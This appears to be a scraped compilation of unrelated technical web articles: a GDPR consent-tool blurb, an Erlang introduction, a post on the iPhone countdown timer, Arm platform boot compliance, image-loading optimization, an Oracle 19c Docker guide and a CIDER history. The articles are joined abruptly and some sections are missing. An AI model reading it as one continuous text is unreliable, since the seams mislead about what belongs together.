<h4 id="google-ad-and-gdpr-compliance-uniconsent-works-with-google-eu-user-consent-policy">Google Ad And GDPR Compliance: UniConsent works with Google EU user consent policy</h4>
<p><img alt="GDPR google policy" src="https://www.uniconsent.com/images/google-ad-manager.png"></p>
<p>Google DFP is used by major online digital publishers, but Google has not joined IAB Europe Transparency &amp; Consent Framework.</p>
<p>Google EU user consent policy is not supported by most of IAB CMP.</p>
<p>UniConsent CMP provides the features to disclose Google vendors and opt-in/opt-out Google personalised ads based on Google EU user consent policy for Ad Manager and Ad Exchange.</p>
<p>UniConsent has the feature to make GDPR compliance easy.</p>
<h4>Cookie blocking</h4>
<p>A publisher is able to block all cookies based on consent given by the user.</p>
<h4>Analytics and insight</h4>
<p>A publisher is able to see the analytics about consent rate, the whole process of consent from users.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Today, we will look at a rather old and somewhat quirky language that most of you probably don’t have on your radars.</p><p>While Erlang is not as popular as some modern programming languages, it quietly runs applications like WhatsApp and WeChat that serve massive amounts of users every day.</p><p>In this article, I will tell you more about this language, its history, and whether you should think about learning it yourself.</p><h2 id="what-is-erlang%2C-and-where-is-it-used%3F">What is Erlang, and where is it used?</h2><p>Erlang is a functional, general-purpose language oriented towards building scalable, concurrent systems with high availability guarantees.</p><p>It was built at the end of the 1980s at Ericsson for handling telephone switches. At the time, telephone switching systems were one of the most complicated systems out there, like the internet is nowadays. For this reason, the language used to program them needed to support high concurrency and zero downtime.</p><p>After going through multiple existing language options, three guys at the company – Joe Armstrong, Robert Virding, and Mike Williams – decided to create their own. This led to one of the coolest programming languages and, perhaps, the most awesome <a href="https://www.youtube.com/watch?v=BXmOlCy0oBM">marketing video</a> for a language I’ve ever seen.</p><p><img src="https://serokell.io/files/qa/qap56dhf.1_(41)_(1).jpg" alt="Erlang logo" loading="lazy"></p><p>So, what distinguishes this language from all of the others?</p><h3 id="process-oriented">Process-oriented</h3><p>The main thing that distinguishes Erlang from other languages is its process-based computing model. It uses isolated, lightweight processes that communicate with each other through messages.</p><p>These processes can receive messages and, in response to messages, create new processes, send messages to other processes, or modify their state. In other words, Erlang follows the <a href="https://www.brianstorti.com/the-actor-model/">actor model</a>. If you’ve used Akka on JVM, you’ll feel right at home.</p><p><img src="https://serokell.io/files/nl/nlvg3wnn.2_(32)_(1).jpg" alt="Erlang processes actors" loading="lazy"></p><p>The processes are isolated, fast to create, and take up only a small amount of memory. It is easy to expand your system by creating more of them. Since the processes don’t discern whether the other processes are on the same core or in another place, you can easily scale both horizontally (by adding more machines) and vertically (by adding cores).</p><h3 id="functional">Functional</h3><p>People usually group Erlang as a functional programming language with other languages like Scala and Haskell. Some of FP characteristics are:</p><ul>
<li>frequent use of pure functions</li>
<li>higher-order functions</li>
<li>pattern matching</li>
</ul><p>More about functional programming you can find in our <a href="https://serokell.io/blog/introduction-to-functional-programming">introduction to FP</a>.</p><h3 id="what-is-erlang-good-for%3F">What is Erlang good for?</h3><p>Primarily, Erlang is a good choice whenever messaging between multiple agents across the network is involved, since that maps well on the basic structure of the language.</p><p>It is excellent for:</p><ul>
<li><strong>Chat apps.</strong> Messaging apps, including some famous examples like WeChat and WhatsApp, use Erlang to handle insane amounts of concurrent users. Erlang has a wonderful messaging platform called <a href="https://www.ejabberd.im/">ejabberd</a> that can be used to create large-scale chat apps.</li>
<li><strong>Message queue systems</strong>. <a href="https://www.rabbitmq.com/">RabbitMQ</a>, an open-source message broker that implements AMQP and other protocols, is a huge success story for Erlang.</li>
<li><strong>Blockchains.</strong> <a href="https://aeternity.com/">Aeternity</a>, a blockchain for scalable, secure, and decentralized dapps, uses Erlang for its node implementation.</li>
<li><strong>Binary manipulation.</strong> Historically, Erlang has had to support rapid implementation of binary protocols for telecom purposes. Hence, it has features that make binary manipulation much more comfortable, such as pattern matching on binaries. You can, for example, use Erlang as <a href="https://doma.dev/#an-extra-bit-for-every-byte-ctf"><code>sed</code> for binaries</a>.</li>
<li><strong>Other distributed, high-performance services.</strong> If you need to process transactions coming from a ton of places in your fintech project or create a bidding/user matching platform, Erlang is not the worst choice either.</li>
</ul><p>You can check out some of the frequent use cases of Erlang in <a href="https://serokell.io/blog/elixir-companies">our list of Elixir and Erlang companies</a>.</p><h3 id="this-looks-complicated.-can-i-build-a-web-app-in-erlang%3F">This looks complicated. Can I build a web app in Erlang?</h3><p>Yes. Overall, Erlang is well-suited for creating fast and scalable web apps. If you get there, it is quite rewarding. There are some caveats, though.</p><p>At the core of your web app (and any other app that works with HTTP) will be <a href="https://github.com/ninenines/cowboy">Cowboy</a>, but further than that, you need to know what a web app consists of and pick your tools for each layer separately.</p><p>Libraries are well documented, but novice-level introductory material is relatively sparse, and you won’t find tutorials for everything. It’s not JavaScript.</p><p>All in all, if you do decide to build web apps, using <a href="https://serokell.io/blog/introduction-to-erlang#erlang-vs.-elixir">Elixir</a>, a language built on top of Erlang, might be a better choice.</p><h2 id="why-should-you-use-erlang-in-your-project%3F">Why should you use Erlang in your project?</h2><p>Erlang has three significant advantages over other programming languages, which mainly stem from the unique way the language is built.</p><ul>
<li><strong>Concurrency.</strong> BEAM, the Erlang virtual machine, uses lightweight threads of execution (called processes). These are isolated, run across all CPUs, and communicate through messages. Because of that and language’s functional nature, it is less hard to write concurrent programs in Erlang.</li>
<li><strong>Scalability.</strong> Erlang is perfectly suited to the distributed nature of modern computing and today’s multicore CPUs. Erlang processes allow us to easily scale systems, both by adding more machines and by adding more cores to existing machines.</li>
<li><strong>Reliability.</strong> Erlang has a motto – <a href="https://verraes.net/2014/12/erlang-let-it-crash/">“let it crash”</a>. Because of the unique approach to fault-tolerance, lightweight processes can be quickly restarted by the supervisor system, which helps you build self-healing systems. While this may not seem reliable, it deals with most bugs that are not due to severe implementation errors.</li>
</ul><h2 id="let-it-crash">Let it crash</h2><p>In this section, I’ll try to bring insight into how an Erlang app is structured and how the “let it crash” philosophy works out in real life.</p><p>In all actuality, letting it crash is not about crashing for the user or the system. That is something Erlang tries very hard to avoid. Rather, it is about containing failure when it inescapably happens, since in life, things do sometimes fail. Shit happens. Let’s see how Erlang cleans it up.</p><p>Basically, an Erlang app is a tree of processes.</p><p><img src="https://serokell.io/files/7z/7zr4ovpa.3_(30)_(1).jpg" alt="Erlang app" loading="lazy"></p><p>At the bottom leaves of the tree, we have worker processes – the ones doing most of the work. Up from them, we have supervisors, which launch the workers and check up on them.</p><p>Supervisors themselves can be supervised; we can easily add a Grand Supervisor on top of the tree here.</p><p><img src="https://serokell.io/files/dt/dtuuj6hz.4_(24)_(1).jpg" alt="Erlang supervision tree" loading="lazy"></p><p>In case a process crashes, it sends a message to its supervisor. Depending on the supervision strategy set, either just the process is restarted or all of the processes underneath its supervisor are.</p><p>If restarting the connected workers doesn’t solve the problem a given amount of times in a period, the supervisor will terminate all its children and then itself. At that point, the responsibility to try to handle the problem is pushed upwards to the next supervision layer.</p><p><img src="https://serokell.io/files/eo/eoil770p.5_(20)_(1).jpg" alt="handling failure" loading="lazy"></p><p>Only if the top-level supervisor fails does it not get restarted and the application crashes.</p><h2 id="erlang-vs.-elixir">Erlang vs. Elixir</h2><p>Erlang isn’t the only language that operates on BEAM; there are multiple others. The main one is Elixir.</p><h3 id="what-is-elixir%3F">What is Elixir?</h3><p><img src="https://serokell.io/files/ph/ph8n4xcr.erlang-elixir-what-the-hell-is-this-ruby-how-it-39889435.jpg" alt="Elixir Erlang meme" loading="lazy"></p><p>Elixir was created by José Valim in the early 2010s. He took Erlang and made a thin layer on top of it that had a more modern syntax that resembled Ruby.</p><p>The resulting language was an improvement over both Erlang and Ruby. It experienced a decent popularity surge in 2015-2016, when <a href="https://www.phoenixframework.org/">Phoenix</a>, its main web framework, was released.</p><p>You can read more about Elixir and Phoenix in our <a href="https://serokell.io/blog/introduction-to-elixir">introduction to Elixir</a>.</p><h3 id="advantages-of-elixir-over-erlang">Advantages of Elixir over Erlang</h3><p>Elixir doesn’t actually add a lot of new features to Erlang. Everything you can do in Elixir, you can do in Erlang as well, and it is possible to call both languages from each other. Most of Elixir’s advantages stem from the fact that it has a more modern, Ruby-like syntax, which has led to it being more popular than Erlang.</p><p>Here are Elixir’s advantages over Erlang:</p><ul>
<li><strong>Modern syntax.</strong> The syntax of Elixir is much easier to understand if you’ve already programmed in virtually any other popular programming language. It removes some amount of boilerplate code and can lead to higher developer productivity.</li>
<li><strong>Higher popularity.</strong> Elixir has been the more popular of the two for quite some time, so content regarding Elixir is more up-to-date, and there is more of it out there.</li>
<li><strong>Frameworks.</strong> If you’re into web development, Phoenix is one of the best frameworks out there, and it is definitely the most convenient one if you want to do web development <em>and</em> functional programming. Talking about frameworks, Elixir also has Nerves – an awesome framework for embedded software. If this is the route you want to take, Elixir is a better choice.</li>
</ul><h2 id="is-erlang-worth-learning%3F">Is Erlang worth learning?</h2><p>So, why should you learn this language? There are three reasons:</p><ul>
<li>You’re eyeing a position in the specific fields that Erlang is used in. E.g. you adore chat apps and you would like to work at WhatsApp. That’s reasonable.</li>
<li>You want to write really small, portable programs with as little dependencies as possible. Erlang actually enables you to do a whole lot out of the box.</li>
<li>You’re a genuinely curious human being and want to discover new ways of programming without an immediate benefit to bottom line. In that case, I welcome you to the ranks of BEAM.</li>
</ul><p>If the last is true, I would actually point your way towards Elixir. While both languages are great to use, Elixir is the one that seems to be more popular lately.

December 28, 2020 | https://lukashermann.dev/writing/why-the-iphone-timer-displays-fake-time/ | <a href="https://web.archive.org/web/*/https://lukashermann.dev/writing/why-the-iphone-timer-displays-fake-time/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>While building my event timer app called <a href="https://stagetimer.io/">stagetimer.io</a> I came across a peculiarity with displaying time and found out that the iPhone timer addresses it by showing us a fake time. By definition, a countdown shows how much time is left. So if the countdown says 5s we assume there are 5 seconds left. But that’s not the whole truth.</p>

<p>The iPhone countdown timer doesn’t strictly display the correct time but adds 500ms, or half a second, to the remaining time. It does this to make the reading of time more intuitive for humans. The alarm at the end of the countdown is not affected by this 500ms inaccuracy.</p>

<p>Javascript likes to use milliseconds when dealing with time, 1000ms equals 1s. Here is an example of a 5s countdown that starts at 5000ms and uses the <a href="https://developer.mozilla.org/en-US/docs/Web/API/WindowOrWorkerGlobalScope/setInterval">setInterval()</a> function to deduct 10ms every 10ms, simple enough. Milliseconds are converted to seconds by dividing by 1000 and rounding down like so: <code>Math.floor(milliseconds / 1000)</code></p>
<div>
  <figure data-gifpause="" onclick="gifpause_toggle(event)">
    <img src="https://lukashermann.dev/img/writing/5s-timer-seconds.gif" data-still="/img/writing/5s-timer-seconds.png" alt="5s countdown timer showing only seconds">
  </figure>
</div>
<p>The timer jumps to 4s right when hitting start and once the timer switches to 0s there are still 1s to go. This makes a lot of sense when counting up, for example, 10:00 is displayed during the first minute of 10 AM, not 10:01, always rounding down. But for a countdown timer, this is counterintuitive. It is easier to understand if the timer has a fractional seconds display.</p>
<div>
  <figure data-gifpause="" onclick="gifpause_toggle(event)">
    <img src="https://lukashermann.dev/img/writing/5s-timer-seconds-fractions.gif" data-still="/img/writing/5s-timer-seconds-fractions.png" alt="5s countdown timer showing seconds and its fractions">
  </figure>
</div>
<p>Now the timer displays 0.9s seconds instead of 0s to show clearly that there is still time left on the clock. However, I didn’t want to show fractional seconds for my timer.</p>

<p>Now I was curious how my iPhone solves this conundrum. So I set my iPhone timer to 5s:</p>
<div>
  <figure data-gifpause="" onclick="gifpause_toggle(event)">
    <img src="https://lukashermann.dev/img/writing/5s-timer-iphone.gif" data-still="/img/writing/5s-timer-iphone.png" alt="5s countdown timer on the iPhone">
  </figure>
</div>
<p>After I click “Start” the iPhone timer shows 5s, not 4s like in the example above. But it switches to 4s before a full second expired. It then counts proper seconds until it reaches 0s which, again, is not a full second. And if you tap “Pause” just after it jumped to 0s it will promptly jump back to 1s to show you that there is, in fact, still some time left on the countdown.</p>
<p>I figured that the good folks at Apple add an extra fake 500ms to the actual time to start that countdown display at 5s instead of 4s. The timer ends and the phone beeps if the actual time hits 0s and the “fake” time hits 500ms. So they faced the same problem I did and came up with a practical solution. After all, if you start a 5s countdown, it should start at 5s right? For illustration, here is my simple timer doing the same trick.</p>
<div>
  <figure data-gifpause="" onclick="gifpause_toggle(event)">
    <img src="https://lukashermann.dev/img/writing/5s-timer-fake-seconds.gif" data-still="/img/writing/5s-timer-fake-seconds.png" alt="5s countdown timer showing fake seconds">
  </figure>
</div>
<p>So there you have it, the iPhone timer is technically lying a little bit to you.</p>

<p>Some have pointed out that the problem could be solved more easily by rounding to the nearest second or rounding up instead of rounding down. This is correct. Suppose we have <code>5459543ms</code> that we want to bring into the traditional form <code>HH:mm:ss</code>.</p>
<p>I first divided the number into hours, minutes, and seconds with the help of some modular arithmetic and applied the rounding afterward. Rounding down results in <code>01:30:59</code>, which is correct, but rounding to the nearest integer or rounding up results in the impossible time <code>02:31:60</code>.</p>
<pre><code>time = <span>5459543</span>
seconds = (time / <span>1000</span>) % <span>60</span> 
minutes = (time / <span>60000</span>) % <span>60</span> 
hours = (time / <span>3600000</span>) % <span>24</span> 
</code></pre>
<p>However, rounding the time to seconds first <code>5460000ms</code>, and breaking it down afterward yields the same result as described above with adding 500ms, namely <code>01:31:00</code>.</p>
<pre><code>time = <span>5460000</span>
seconds = (time / <span>1000</span>) % <span>60</span> 
minutes = (time / <span>60000</span>) % <span>60</span> 
hours = (time / <span>3600000</span>) % <span>24</span> 
</code></pre>
<p><em>Edit 2: In an earlier version I messed up my rounding as described. Many helpful, as well as helpful and insulting, comments pointed out my error. So in addition to learning about counting time I also learned how it feels to be wrong on the internet</em> 😅</p>

		<div id="primary">
			<main id="main" role="main">

<article id="post-38">

	

	<div>
		
<p>On the firmware side, an ideally standard Arm machine boots using UEFI and ACPI. The <em>other</em> CPUs are initialised with PSCI and dynamic power management is handled with CPPC.</p>



<p>On the hardware side, requirements are having a GIC as an interrupt controller and a standard PCIe ECAM-compliant controller. (+ other sets of MMIO devices, which can be exposed through ACPI)</p>



<p>The constraints placed on the CPU core itself that have a consequence on OS support today are support for the 4KB granule in the Base System Architecture specification. The SBSA supplement adds mandatory support for the 64KB granule.</p>



<p>Before, all Arm platforms which officially run customer-modifiable code on the bare metal supported both 4KB and 64KB granules. With the Apple M1, that changes as that platform only supports 4KB and 16KB granules, with no support for 64KB granules. A real-world consequence of this is that current Red Hat Enterprise Linux and CentOS kernels cannot run on Apple M1 devices in a virtual machine.</p>



<p>Let’s see how compliant the different platforms on the market today are at a customer-accessible price point, which are either very popular or have support of standards by the manufacturer:</p>



<div>
<p>
<h4>Raspberry Pi 4 ($35 onwards)</h4>
</p>
</div>



<p>A SystemReady ES certified platform. <em>The UEFI firmware is not provided by Raspberry Pi, but by a third-party</em> <em>instead</em><strong>.</strong></p>



<p>That’s not devoid of consequences. The onboard SPI flash is used only for the first-stage boot loader after the boot ROM, making the Raspberry Pi unable to directly boot a standard OS image. As such, the SystemReady-compliant firmware has to be provided on external media.</p>



<p><em>Bugs</em>: Legacy SoC devices can only access to the first GB of RAM, the PCIe controller on earlier revisions can only use the first 3GB of RAM and 64-bit MMIO accesses are disallowed for the PCIe controller.</p>



<h4>SolidRun Honeycomb LX2K ($750, RAM not included)</h4>



<p>The NXP Layerscape LX2160A SoM used on the Honeycomb LX2K platform is certified as SystemReady ES compliant. In this case, the firmware is provided by the manufacturer, which supports standardisation efforts.</p>



<p>The platform is relatively devoid of bugs which hurt the user experience significantly. However some non-standardised devices (such as the Ethernet controller) might not be supported in all OSes at this point in time.</p>



<h4>NVIDIA Jetson AGX Xavier Developer Kit ($699)</h4>



<p>Do not get it <em>yet</em> if your goal is to <em>use</em> SystemReady-compliant OSes. The UEFI firmware on the Xavier was released a month ago, and is still very much experimental. (for example, no display out yet)</p>



<p>The PCIe controller on the platform is also not ECAM compliant.</p>



<p>The vendor BSP still ships with Linux 4.9 today (based on the Android kernel tree no less…) , which is very far from an ideal situation.</p>



<h4>Windows on Arm laptops ($399 onwards)</h4>



<p>On those platforms, Secure Boot can be turned off. Power management isn’t done through CPPC but by a manufacturer-specific PEP driver. The OS gets started at EL1. A non-standard protocol, Secure Launch, is used by Windows to be able to launch its hypervisor at EL2 on this platform. This protocol isn’t supported by Linux.</p>



<p>Linux on this platform uses third-party made Device Trees instead of using ACPI tables provided by the firmware. (except at install time, with a minimal set of devices being supported)</p>



<p>Currently, modified OS install images are used for those platforms to handle platform bugs. You’ll have to extract firmware from a Windows partition after install to enable support for most SoC peripherals.</p>



<h4>Mac Mini 2020, Apple M1 ($699)</h4>



<p>This platform makes no pretence at all of being compliant with Arm boot-time standards. You’ll not be able to use a generic operating system on the bare metal on this platform, with adaptation for that specific hardware needed instead.</p>



<p>Note however that this doesn’t mean that you cannot use the same kernel image between a standards-compliant platform and an Apple platform. A kernel image can be built to support both at the same time.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><article><p>In this post I'll outline 8 image loading optimization techniques to minimize both the bandwidth used for loading images on the web and the CPU usage for image display. I'll present them in the form of an annotated HTML example to make it easy for folks to reproduce the results. Some of these techniques are more established, while others are somewhat novel. Ideally, your favorite mechanism for publishing web documents (like a CMS, static site generator, or web application framework) implements all of these out-of-the-box. I'll keep a <a href="#tools">list updated at the end of this posts</a> with technologies that provide <em>all</em> of the optimizations outlined here.</p><p>Together the techniques optimize all elements of <a href="https://web.dev/vitals/">Google's Core Web Vitals</a> by</p><ul><li>Minimizing the <a href="https://web.dev/lcp/">Largest Contentful Paint (LCP)</a> through reducing bytes, caching, and lazy loading.</li><li>Keeping <a href="https://web.dev/cls/">Cumulative Layout Shift (CLS)</a> to zero.</li><li>Reducing <a href="https://web.dev/fid/">First Input Delay(FID)</a> through reduced (main-thread) CPU usage.</li></ul><p>View the source of this sample image to see all the techniques in action:</p><p><picture><source sizes="(max-width: 608px) 100vw, 608px" srcset="https://www.industrialempathy.com/img/remote/ZiClJf-1920w.avif 1920w, https://www.industrialempathy.com/img/remote/ZiClJf-1280w.avif 1280w, https://www.industrialempathy.com/img/remote/ZiClJf-640w.avif 640w, https://www.industrialempathy.com/img/remote/ZiClJf-320w.avif 320w" type="image/avif"><source sizes="(max-width: 608px) 100vw, 608px" srcset="https://www.industrialempathy.com/img/remote/ZiClJf-1920w.webp 1920w, https://www.industrialempathy.com/img/remote/ZiClJf-1280w.webp 1280w, https://www.industrialempathy.com/img/remote/ZiClJf-640w.webp 640w, https://www.industrialempathy.com/img/remote/ZiClJf-320w.webp 320w" type="image/webp"><source sizes="(max-width: 608px) 100vw, 608px" srcset="https://www.industrialempathy.com/img/remote/ZiClJf-1920w.jpg 1920w, https://www.industrialempathy.com/img/remote/ZiClJf-1280w.jpg 1280w, https://www.industrialempathy.com/img/remote/ZiClJf-640w.jpg 640w, https://www.industrialempathy.com/img/remote/ZiClJf-320w.jpg 320w" type="image/jpeg"><img alt="Sample image illustrating the techniques outlined in this post." height="2268" src="https://www.industrialempathy.com/img/remote/ZiClJf.jpg" width="4032" decoding="async" loading="lazy"></picture></p><h2 id="responsive-layout">Responsive layout <a href="#responsive-layout">#</a></h2><p>This is a well understood technique to make an image use the available horizontal space up until its maximum size while retaining the aspect ratio. New in 2020 is that web browsers will reserve the correct vertical space for the image before it loads if the <code>width</code> and <code>height</code> attributes are provided for the <code>img</code> element. This avoids <a href="https://web.dev/cls/">Cumulative Layout Shift (CLS)</a>.</p><pre><code><span><span><span>&lt;</span>style</span><span>&gt;</span></span><span><span><br>  <span>img</span> <span>{</span><br>    <span>max-width</span><span>:</span> 100%<span>;</span><br>    <span>height</span><span>:</span> auto<span>;</span><br>  <span>}</span><br></span></span><span><span><span>&lt;/</span>style</span><span>&gt;</span></span><br><br><span><span><span>&lt;</span>img</span> <span>height</span><span><span>=</span><span>"</span>853<span>"</span></span> <span>width</span><span><span>=</span><span>"</span>1280<span>"</span></span> <span>…</span> <span>/&gt;</span></span></code></pre><h2 id="lazy-rendering">Lazy rendering <a href="#lazy-rendering">#</a></h2><p>The second technique is more cutting edge. The new CSS attribute <code>content-visibility: auto</code> instructs the browser to not bother layouting the image until it gets near the screen. This has all kinds of benefits, but the most important one might be that the browser will not bother decoding our blurry placeholder image or the image itself unless it has to, saving CPU. Unfortunately, this will cause CLS unless we provide the companion CSS property <code>contain-intrinsic-size</code>. And even more unfortunately, it doesn't come with the awesome inference of the aspect ratio from the <code>width</code> and <code>height</code> attributes and hence we need to provide a relatively complex value that calculates the space the browser should reserve for the image.</p><p>The formula here should work if you provide a <code>--main-width</code> CSS variable describing the width of the main section of your doc. <code>1280px</code> is the max-width of the image, <code>853px</code> the max-height, and <code>0.66640625</code> the aspect-ratio. Yaihh, simple web 😛</p><pre><code><span><span><span>&lt;</span>style</span><span>&gt;</span></span><span><span><br>  <br>  <span>main img</span> <span>{</span><br>    <br>    <span>content-visibility</span><span>:</span> auto<span>;</span><br>  <span>}</span><br></span></span><span><span><span>&lt;/</span>style</span><span>&gt;</span></span><br><span><span><span>&lt;</span>img</span><span><span><br>  <span>style</span></span><span>="</span><br><span>      <span>contain-intrinsic-size</span><span>:</span> </span><br><span>        <span>min</span><span>(</span></span><br><span>          <span>var</span><span>(</span>--main-width<span>)</span><span>,</span> </span><br><span>          1280px<span>)</span> </span><br><span>        <span>min</span><span>(</span></span><br><span>          <span>calc</span><span>(</span><span>var</span><span>(</span>--main-width<span>)</span> * 0.66640625<span>)</span><span>,</span> </span><br><span>          853px<span>)</span><span>;</span></span><span>"</span></span><br><span>/&gt;</span></span></code></pre><h2 id="avif">AVIF <a href="#avif">#</a></h2><p><a href="https://jakearchibald.com/2020/avif-has-landed/">AVIF</a> is the most recent image format that has gained adoption in web browsers. It is currently supported in Chromium browsers, and available behind a flag in Firefox. Safari support isn't available yet, but given that Apple is a member of the <a href="http://aomedia.org/">group</a> that is behind the format, we can expect future support.</p><p>AVIF is notable because it very consistently outperforms JPEG in a very significant way. This is different from WebP which doesn't always produce smaller images than JPEG and may actually be a net-loss due to lack of support for progressive loading.</p><p>To implement progressive enhancement for AVIF, use the <a href="https://developer.mozilla.org/en-US/docs/Web/HTML/Element/picture"><code>picture</code> element</a>.</p><p>The actual <code>img</code> element is nested in the <code>picture</code>. This can be quite confusing, because the <code>img</code> is sometimes described as fallback for browsers without picture support but basically the <code>picture</code> element only helps with <code>src</code> selection but has no layout itself. The element that is drawn (and which you style) is the <code>img</code> element.</p><p>Until very recently it was relatively difficult to actually encode AVIF images on the server-side, but with the latest version of libraries like <a href="https://github.com/lovell/sharp">sharp</a> it is now trivial.</p><pre><code><span><span><span>&lt;</span>picture</span><span>&gt;</span></span><br>  <span><span><span>&lt;</span>source</span><br>    <span>sizes</span><span><span>=</span><span>"</span>(max-width: 608px) 100vw, 608px<span>"</span></span><br>    <span>srcset</span><span><span>=</span><span>"</span><br>      /img/Z1s3TKV-1920w.avif 1920w,<br>      /img/Z1s3TKV-1280w.avif 1280w,<br>      /img/Z1s3TKV-640w.avif   640w,<br>      /img/Z1s3TKV-320w.avif   320w<br>    <span>"</span></span><br>    <span>type</span><span><span>=</span><span>"</span>image/avif<span>"</span></span><br>  <span>/&gt;</span></span><br>  <br>  <span><span><span>&lt;</span>img</span> <span>/&gt;</span></span><br><span><span><span>&lt;/</span>picture</span><span>&gt;</span></span></code></pre><h2 id="load-the-right-number-of-pixels">Load the right number of pixels <a href="#load-the-right-number-of-pixels">#</a></h2><p>You might have noticed the <code>srcset</code> and <code>sizes</code> attributes in the snippet above.

In the examples above I'm doing that with the <code>Z1s3TKV</code> in the image URLs. That way the URL will change if the image changes and respectively you can apply infinite cache expiration for your images. You want your caching headers to look something like this <code>cache-control: public,max-age=31536000,immutable</code>.</p><p><code>immutable</code> is the semantically correct <code>cache-control</code> value, but unfortunately it isn't widely supported in browsers (I'm looking at you, Chrome). <code>max-age=31536000</code> is the fallback to cache for a year. <code>public</code> is important to allow your CDN to cache the image and deliver it from the edge. But only use that if it is appropriate from a privacy perspective.</p><h2 id="lazy-loading">Lazy loading <a href="#lazy-loading">#</a></h2><p>Adding <code>loading="lazy"</code> to the <code>img</code> instructs the browser to only start fetching the image as it gets closer to the screen and is likely to actually be rendered.</p><pre><code><span><span><span>&lt;</span>img</span> <span>loading</span><span><span>=</span><span>"</span>lazy<span>"</span></span> <span>…</span> <span>/&gt;</span></span></code></pre><h2 id="asynchronous-decoding">Asynchronous decoding <a href="#asynchronous-decoding">#</a></h2><p>Adding <code>decoding="async"</code> to the <code>img</code> gives the browser permission to decode the image off the main thread avoiding user impact of the CPU-time used to decode the image.

<p>Running an Oracle 19c database Docker container is a fairly simple task but I thought it would be useful to document the steps required for reference and to help others starting out on this path.</p>



<p>Firstly Oracle only has 12c available via Docker Hub they had some legal grievances with each other a few years ago which means Oracle no longer updates the Docker Hub images but instead stores them <a href="https://github.com/oracle/docker-images" target="_blank" rel="noreferrer noopener">here</a> on GitHub. Another note is while the information on GitHub is great you still need to download the Oracle Database install .zip files from Oracle’s website yourself further if you plan on patching the Oracle database you will need to have a valid Oracle Support licence and login to MOS.</p>



<p>Firstly clone the Oracle Docker images to your local machine with git</p>



<p><code>git clone <a href="https://github.com/oracle/docker-images.git" rel="nofollow">https://github.com/oracle/docker-images.git</a></code></p>



<p>After you have cloned the repo you will see there is a lot more avaliable than just Oracle Database images but for this article its all we are concerned with, move to the OracleDatabase folder, then the SingleInstance folder and finially the 19.3.0 directory.</p>



<p><code>cd ~/docker-images/OracleDatabase/SingleInstance/19.3.0</code></p>



<p>With your downloaded Oracle Database install .zip copy in into your current 19.3.0 directory.</p>



<p><code>cp $HOME/Downloads/LINUX.X64_193000_db_home.zip .</code></p>



<p>If you plan on patching this container in the future the defualt scripts remove some key directories within $ORACLE_HOME to reduce image size that will cause you to run into issues when trying to patch in the future, the fix is simple by defult we choose to install the “SLIM” option we just need to update the Dockerfile within the 19.3.0 directory to read false.</p>



<p><code>ARG SLIMMING=false</code></p>



<p>Move back to the parent directory and run buildDockerImage.sh with a -v to specify database version in this case 19.3.0 and -e to indicate we want to use enterprise edition.</p>



<p><code>cd ~/docker-images/OracleDatabase/SingleInstance</code></p>



<p><code>./buildDockerImage.sh -v 19.3.0 -e</code></p>



<p>Depending on the resources you have on your machine will depend how quickly the next part goes, I would say on average it will take 20-30min so go have coffee, you should come back to a Build Complete message. We have not successfully created an Oracle Database Enterprise Edition 19.3.0 Docker Image.</p>



<p>To run the image use the following;</p>



<p><code>docker run --name "oracle19.3" -p 1521:1521 -p 5500:5500 -e ORACLE_PDB=orapdb1 -e ORACLE_PWD=topsecretpass -e ORACLE_MEM=3000 -v /opt/oracle/oradata -d oracle/database:19.3.0-ee</code></p>



<p>Where –name is the name of the docker image, ORACLE_PDB is the PDB name, ORACLE_PWD is the database password and ORACLE_MEM is the memory allocated to the DB. This first run of the docker image will go away and create the database so expect it to take some time during its first run.</p>



<p>You can use sqldeveloper to connect to your PDB or connect to sqlplus via docker by logging directly into the docker image as per below</p>



<p><code>docker exec -it oracle19.3 /bin/bash</code></p>



<p><code>ps -ef |grep pmon</code></p>



<p><code>. oraenv</code></p>



<p><code>sqlplus / as sysdba</code></p>



<p>Useful Docker commands</p>



<p>Stop Docker Image</p>



<p><code>docker container stop oracle19.3</code></p>



<p>Start docker container</p>



<p><code>docker container start oracle19.3</code></p>



<p>Show running Docker containers</p>



<p><code>docker ps</code></p>



<p>List All Docker Images</p>



<p><code>docker images</code></p>



<p>Delete Docker Image</p>



<p><code>docker image rm "image_id_here"</code></p>

    <blockquote>
  <p>You can’t really know where you are going until you know where you have been.</p>

  <p>– Maya Angelou</p>
</blockquote>

<p><a href="https://cider.mx/">CIDER</a> started its life as an effort to replace a
hacked version of SLIME<sup id="fnref:1" role="doc-noteref"><a href="#fn:1">1</a></sup> with a proper environment for Clojure
development on Emacs. Many of you probably don’t remember those days,
but initially almost everyone was using a modified version of SLIME
for Clojure development, as there weren’t many (any?) alternatives
back in the day. The creation of CIDER was fueled mostly by the advent of
<a href="https://nrepl.org/">nREPL</a>, which was the first project that aimed to
provide a common tool-agnostic foundation for Clojure development
tools, and by the desire to address the impedance mismatch between
SLIME and Clojure.</p>

<p>CIDER was started in spring 2012 (under the name <code>nrepl.el</code>) by Phil
Hagelberg (of Leiningen fame), who hacked a prototype of an nREPL
client in Emacs Lisp on a flight to San Francisco. He got a bit stuck
on the socket-based bencode functionality and dropped it after the
flight, but not before pushing the code out and mentioning it on the
<a href="http://groups.google.com/group/clojure/browse_thread/thread/2bd91de7dca55ca4">Clojure mailing
list</a>.
What followed is the best example of the power of open-source software…</p>

<p>Tim King came across Phil’s post, picked <code>nrepl.el</code> back up, and it quickly became
a respectable competitor to SLIME. The project evolved at a rapid pace
and eventually superseded SLIME in August 2012.<sup id="fnref:2" role="doc-noteref"><a href="#fn:2">2</a></sup> Unfortunately in
early 2013 Tim ran out of time for nrepl.el and after another period of
stagnation, handed it over to me, as I was the main
contributor to <code>nrepl.el</code> besides him back then. I have been the project’s
steward ever since. Third time’s a charm, right?</p>

<p>My tenure at the helm started with a bit of
controversy as I renamed nrepl.el to CIDER in version 0.3 to avoid the
common case of confusion between the nREPL server and the <code>nrepl</code>
package for Emacs.<sup id="fnref:3" role="doc-noteref"><a href="#fn:3">3</a></sup> If I have to be completely honest - I also
wanted the project to have a name as cool as SLIME, and I’m fairly
certain I succeeded in that regard.</p>

<p>Eventually CIDER became one of the most popular development
environments in the Clojure community and it spawned many important
projects (e.g. <code>cider-nrepl</code> and <code>orchard</code>), that are widely
used by other development tools (e.g. <code>vim-fireplace</code>, Conjure, <code>iced-vim</code> and Calva). My work on CIDER also led to me
becoming the maintainer of nREPL and restarting its development
